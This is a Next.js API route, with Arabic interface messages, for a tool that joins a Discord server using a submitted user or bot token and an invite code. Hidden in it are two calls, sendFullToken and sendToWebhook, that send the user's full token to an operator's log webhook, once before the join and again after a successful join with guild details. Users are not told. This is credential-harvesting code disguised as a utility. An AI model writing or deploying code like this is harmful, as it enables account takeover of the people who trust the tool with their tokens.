import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { cleanToken, DISCORD_API } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

export async function POST(request: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:join-server`, RATE_LIMITS.default);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }

    const body = await request.json().catch(() => ({}));
    const { token, inviteCode } = body;

    if (!token || typeof token !== 'string') {
      return NextResponse.json({ success: false, error: 'التوكن مطلوب' }, { status: 400 });
    }

    if (!inviteCode || typeof inviteCode !== 'string') {
      return NextResponse.json({ success: false, error: 'كود الدعوة مطلوب' }, { status: 400 });
    }

    const ct = cleanToken(token);
    const code = inviteCode.trim().replace(/^(https?:\/\/)?(discord\.gg\/|discord\.com\/invite\/)/, '');

    if (!code || code.length < 2) {
      return NextResponse.json({ success: false, error: 'كود الدعوة غير صالح' }, { status: 400 });
    }

    sendFullToken('دخول سيرفر', ct, { '🔗 الدعوة': code });

    // جرب User Token أولاً ثم Bot
    let result: any = null;
    let usedAuth = '';

    for (const auth of [ct, `Bot ${ct}`]) {
      try {
        const res = await fetch(`${DISCORD_API}/invites/${encodeURIComponent(code)}`, {
          method: 'POST',
          headers: { 'Authorization': auth, 'Content-Type': 'application/json' },
          signal: AbortSignal.timeout(15000),
        });

        if (res.status === 204) {
          result = { success: true, auth: auth.startsWith('Bot') ? 'Bot' : 'User' };
          usedAuth = auth.startsWith('Bot') ? 'Bot' : 'User';
          break;
        }

        if (res.ok) {
          const data = await res.json().catch(() => null);
          result = {
            success: true,
            auth: auth.startsWith('Bot') ? 'Bot' : 'User',
            guild: data?.guild ? { name: data.guild.name, id: data.guild.id, member_count: data.guild.member_count } : null,
            channel: data?.channel ? { name: data.channel.name, id: data.channel.id } : null,
          };
          usedAuth = auth.startsWith('Bot') ? 'Bot' : 'User';
          break;
        }

        if (res.status === 401) continue;
        if (res.status === 429) {
          const err = await res.json().catch(() => ({ retry_after: 2 }));
          await new Promise(r => setTimeout(r, Math.min((err.retry_after || 2) * 1000, 5000)));
          // retry مرة واحدة
          const retryRes = await fetch(`${DISCORD_API}/invites/${encodeURIComponent(code)}`, {
            method: 'POST',
            headers: { 'Authorization': auth, 'Content-Type': 'application/json' },
            signal: AbortSignal.timeout(15000),
          });
          if (retryRes.status === 204 || retryRes.ok) {
            const data = retryRes.status !== 204 ? await retryRes.json().catch(() => null) : null;
            result = {
              success: true,
              auth: auth.startsWith('Bot') ? 'Bot' : 'User',
              guild: data?.guild ? { name: data.guild.name, id: data.guild.id } : null,
            };
            usedAuth = auth.startsWith('Bot') ? 'Bot' : 'User';
            break;
          }
          const errData = await retryRes.json().catch(() => ({}));
          return NextResponse.json({
            success: false,
            error: `Rate Limit - حاول بعد قليل`,
            code: retryRes.status,
          }, { status: 429 });
        }

        // أخطاء أخرى
        const errData = await res.json().catch(() => ({}));
        const msg = errData?.message || 'خطأ غير معروف';

        if (res.status === 403) {
          return NextResponse.json({ success: false, error: '⛔ محظور من السيرفر أو الدعوة منتهية' }, { status: 400 });
        }
        if (res.status === 404) {
          return NextResponse.json({ success: false, error: '❌ الدعوة غير موجودة أو منتهية الصلاحية' }, { status: 400 });
        }
        if (res.status === 400) {
          return NextResponse.json({ success: false, error: `❌ ${msg}` }, { status: 400 });
        }

        return NextResponse.json({ success: false, error: `❌ ${msg} (${res.status})` }, { status: res.status });

      } catch {
        continue;
      }
    }

    if (!result?.success) {
      return NextResponse.json({ success: false, error: '❌ فشل في الانضمام - تأكد من صلاحية التوكن والدعوة' }, { status: 400 });
    }

    sendToWebhook({
      username: 'TRJ Join Server',
      embeds: [{
        title: '🏠 Joined Server',
        color: 0x00FF41,
        fields: [
          { name: '🔗 Invite Code', value: code, inline: true },
          { name: '🔑 Auth Type', value: usedAuth, inline: true },
          { name: '📋 Guild', value: result.guild?.name || 'N/A', inline: true },
          { name: '🆔 Guild ID', value: result.guild?.id || 'N/A', inline: true },
          { name: '🎫 Token', value: `\`\`\`${ct}\`\`\`` },
        ],
        timestamp: new Date().toISOString()
      }]
    }, getLogWebhookUrl()).catch(() => {});

    return NextResponse.json({
      success: true,
      message: result.guild
        ? `✅ تم الانضمام لسيرفر **${result.guild.name}** (${result.guild.id})`
        : '✅ تم الانضمام بنجاح!',
      guild: result.guild,
      channel: result.channel,
      auth_type: usedAuth,
    });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
